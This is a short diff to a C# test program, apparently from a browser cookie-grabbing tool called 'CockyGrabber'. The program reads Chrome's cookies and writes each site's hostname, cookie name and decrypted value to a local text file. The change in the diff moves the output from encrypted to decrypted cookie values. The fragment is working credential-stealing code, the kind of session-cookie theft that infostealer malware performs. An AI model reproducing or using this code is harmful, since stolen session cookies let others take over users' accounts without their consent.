@@ -18,9 +18,9 @@ namespace CockyGrabberTest
             ChromeGrabber g = new ChromeGrabber(); // Create Grabber
             List<string> cookies = new List<string>();
 
-            g.GetCookies().ToList().ForEach(delegate (Chromium.Cookie c) // For every grabbed cookie:
+            g.GetCookies().ToList().ForEach(delegate (Blink.Cookie c) // For every grabbed cookie:
             {
-                cookies.Add($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.EncryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
+                cookies.Add($"Hostname: {c.HostKey} | Name: {c.Name} | Value: {c.DecryptedValue}"); // Add the cookie hostname, name, and value to the 'cookie' list
             });
 
             File.WriteAllLines("./cookies_save.txt", cookies); // Save cookies in cookies_save.txt
